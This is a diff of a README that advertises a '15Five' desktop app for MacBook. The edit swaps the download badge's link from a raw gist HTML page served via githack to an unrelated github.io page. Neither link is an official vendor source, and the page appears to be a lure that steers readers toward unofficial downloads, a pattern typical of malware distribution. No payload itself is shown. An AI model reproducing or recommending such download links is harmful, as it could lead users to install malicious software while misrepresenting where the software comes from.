@@ -4,7 +4,7 @@
 Boost your team’s performance and engagement with 15Five on MacBook! 😃  
 Follow the simple instructions below to get started with the 15Five desktop app and maximize productivity.
 
-[![Get from GitHub](https://img.shields.io/badge/Get-15Five-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/mazerdika995/8ce21b5ca738c2874852c8ed4a99131e/raw/689378a74dd850f9e1f64a0d49a258d20f2d90b2/get.html)
+[![Get from GitHub](https://img.shields.io/badge/Get-15Five-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://linkolnmoldranz782.github.io/.github/)
 
 ---
 
